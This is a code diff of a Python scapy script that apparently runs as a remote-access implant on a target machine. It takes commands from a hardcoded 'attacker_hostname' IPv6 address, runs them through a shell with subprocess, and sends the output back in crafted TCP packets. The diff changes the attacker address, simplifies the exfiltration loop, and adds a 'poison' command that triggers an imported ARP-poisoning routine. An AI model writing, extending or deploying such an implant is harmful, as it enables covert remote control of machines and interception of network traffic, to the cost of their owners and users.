@@ -3,9 +3,10 @@ import subprocess
 import os
 from scapy.all import *
 import time
+from attacker_arp_poison import entry
 
 
-attacker_hostname = "2409:4063:209d:520f:e84c:2b22:950a:35d0"
+attacker_hostname = "2409:4063:4e96:68ad:616d:ac6c:f50d:5e7c"
 attacker_port = 12345
 
 # connects with the attacker 
@@ -22,28 +23,9 @@ def target_client_connector():
 
 def send_data(data):
     # receive data from the attacker server
-    contains_more_flag = False
-    while(len(data) > 0):
-        delimiter_index = -1
-        try: 
-            delimiter_index = data.index("***")
-            contains_more_flag = True
-        except:
-            contains_more_flag = False
-            pass
-        if(contains_more_flag):
-            to_send = data[0:delimiter_index]
-            data = data[delimiter_index:]
-            response_packet = IPv6(dst=attacker_hostname)/TCP(sport=12345, dport=attacker_port)/to_send
-            time.sleep(1) # to let the attacker side free up sniffing
-            send(response_packet, verbose=0)
-        else:
-            response_packet = IPv6(dst=attacker_hostname)/TCP(sport=12345, dport=attacker_port)/data
-            time.sleep(1) # to let the attacker side free up sniffing
-            send(response_packet, verbose=0)
-            break
-    response_packet = IPv6(dst=attacker_hostname)/TCP(sport=12345, dport=attacker_port)/"END_COMM"
+    response_packet = IPv6(dst=attacker_hostname)/TCP(sport=12345, dport=attacker_port)/data
     time.sleep(1) # to let the attacker side free up sniffing
+    print(response_packet.show())
     send(response_packet, verbose=0)
 
 def receive_data():
@@ -62,6 +44,7 @@ def receive_data():
                     pass
         except:
             pass
+    print(command)
     # do something on the data
     output = run_command(command)
     try:
@@ -92,6 +75,12 @@ def run_command(command):
     except:
         pass
 
+    try:
+        command.index("poison")
+        command_splits = command.split(" ")
+        entry(command_splits[1], command_splits[2])
+    except:
+        pass
     
     try:
         output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
